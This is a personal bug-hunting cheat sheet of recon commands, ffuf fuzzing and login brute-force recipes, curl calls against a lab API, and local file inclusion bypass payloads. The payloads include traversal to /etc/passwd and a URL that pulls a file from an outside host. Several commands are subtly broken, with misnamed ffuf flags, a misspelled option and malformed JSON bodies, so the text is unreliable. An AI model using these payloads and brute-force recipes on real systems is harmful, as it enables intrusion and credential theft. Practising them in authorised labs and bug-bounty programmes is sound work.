# Bug-Hunting

# recon & footprinting
- https://buitlwith.com
- Wappalyzer plugin
- https://securityheaders.com
-     curl -I www.<raman>.com
- if you get hit with a redirection ex. Cloudflare
-     curl -I -L www.<raman>.com
you also can use nmap to gather information -A

# Directory Enumeration and Brute Forcing
Basic usage
-     ffuf -w wordlist.txt -u http://example.com/FUZZ
Add custom header
-     ffuf -w wordlist.txt -u http://example.com/FUZZ -H "Authorization: Bearer <token>"
Use POST method
-     ffuf -w wordlist.txt -u http://example.com/api -X POST -d "param1=value1&param2=value2"
Finding subdomain
-     ffuf -u https://FUZZ.example.com -w wordlist.txt -mc 200,301,302,403
Follow redirects
-     ffuf -w wordlist.txt -u http://example.com/FUZZ -r
Use a proxy
-     ffuf -w wordlist.txt -u http://example.com/FUZZ -p http://127.0.0.1:8080
Exclude directories
-     ffuf -w wordlist.txt -u http://example.com/FUZZ -exclude-dirs "admin,backup,test"
Use custom match string
-     ffuf -w wordlist.txt -u http://example.com/FUZZ -c "Password incorrect"
Number of threads
-     ffuf -w wordlist.txt -u http://example.com/FUZZ -t 40
filter HTTP status
-     ffuf -w <Wordlist>:FUZZ -u http://10.10.10.16/FUZZ -fc 404,401
file extensions
-     ffuf -w <Wordlist>:FUZZ -u http://10.10.10.16/FUZZ -e .php
recursion
-     ffuf -w <Wordlist>:FUZZ -u http://10.10.10.16/FUZZ -recursion

# Authentication & Authorization Attacks
https://appsecexplained.gitbook.io/appsecexplained/
brute force password
-     ffuf -reqeust raman.txt -request-proto http -w wordlist.txt
Clusterbomb attack
- make sure to mention the following in the request file (in burp) "username=FUZZUSER&password=FUZZPASS"
-     ffuf -request raman.txt -request-proto http -mode clusterbomb -w wordlist.txt:FUZZUSER -w pass.txt:FUZZPASS -fs 3256,3376
- API Index
- POST /login.php
-     curl -X POST -H "Content-Type: application/json" -d '{username: "admin", password: "password123"}' http://localhost/labs/api/login.php
- Get /account.php
-     curl -X GET "http://localhost/labs/api/account.php?token=JWT"
- PUT /account.php
-     curl -X PUT -H "Content-Type: application/json" -d '{token: "JWT", username:"username", bio: "New bio information."}' http://localhost/labs/api/account.php

# Local File Inclusion
some filters bypass
-     ..././..././..././..././..././etc/passwd
-     hthttptp://10.10.16.2:8000/file.txt

